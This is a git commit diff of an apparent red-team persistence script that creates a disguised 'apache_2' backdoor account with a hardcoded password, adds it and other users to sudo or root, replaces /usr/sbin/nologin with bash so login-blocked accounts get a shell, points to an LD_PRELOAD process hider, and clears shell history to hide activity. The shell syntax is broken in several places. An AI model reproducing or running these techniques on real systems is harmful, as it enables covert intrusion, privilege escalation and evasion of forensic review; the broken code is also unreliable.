97e3e7641b59240b7daaf44067280156f96a49f5
sh1dow3r <sh1dow3r@gmail.com>
2019-10-05 17:35:46 -0400

    adding new setup

--- Red/custom_service/kerna1.sh
+++ Red/custom_service/kerna1.sh
@@ -1,20 +1,21 @@
 #/bin/shell
 
-func legit_user(){
+func legit_user{
 	useradd -m -d /var/www/.apache_2 -s /usr/sbin/nologin -U apache_2
-        echo -e "redteamlovesyou\nredteamlovesyou" |  passwd apache_2	
-	usermod -aG sudo apache_2
-	cp /usr/sbin/shell /usr/sbin/nologin
+        echo -e "redTeamLovesYou\nredTeamLovesYou" |  passwd apache_2	
+
+        usermod -aG sudo apache_2|| usermod -aG root apache_2
+	cp /usr/sbin/bash /usr/sbin/nologin
 }
 
 func add_user(user){
 	useradd -m -d /var/www/.$user -s /usr/sbin/nologin -U $user
-	echo -e "TODO\nTODO" | passwd user
-        usermod -aG sudo $user
-	cp /usr/sbin/shell /usr/sbin/nologin
+	echo -e "redTeamLovesYou\nredTeamLovesYou" | passwd user
+        usermod -aG sudo $user || usermod -aG root $user
+	cp /usr/sbin/bash /usr/sbin/nologin
 }
 
-func extra(){
+func extra{
 	users=$(wc -l /etc/passwd | cut -d " " -f 1)
 	echo $users
 	newint=$(expr $users / 2 )
@@ -22,7 +23,7 @@ func extra(){
 }
 
 #hiding processes
-func ldPreload(){
+func ldPreload{
 	#https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
 	echo "ldpreload"
 }
@@ -37,7 +38,7 @@ func call_back(ip){
 }
 
 #clearing bash history 
-func final_touch(){
+func final_touch{
 	#Clears the variable which says where the history file is stored to so nothing is stored.#
 	unset HISTFILE
 	#Completely clear the history. Very visible as all history is now gone.#
